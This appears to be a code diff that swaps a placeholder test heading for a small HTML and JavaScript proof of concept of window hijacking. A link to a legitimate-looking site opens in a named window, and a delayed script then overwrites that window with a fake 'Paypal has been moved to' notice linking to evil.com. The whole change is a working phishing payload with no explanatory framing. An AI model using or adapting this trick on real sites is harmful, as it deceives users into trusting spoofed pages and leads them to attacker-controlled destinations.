@@ -1,1 +1,8 @@
-<h1>test</h1>
+<script>
+function pwned() {
+var t = window.open('', 'ss');
+t.document.write(`<h1>Paypal has been moved to</h1><a href="https://evil.com">Evil.com</a>`);
+t.stop();
+}
+</script>
+<a href="https://legitsite.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a>
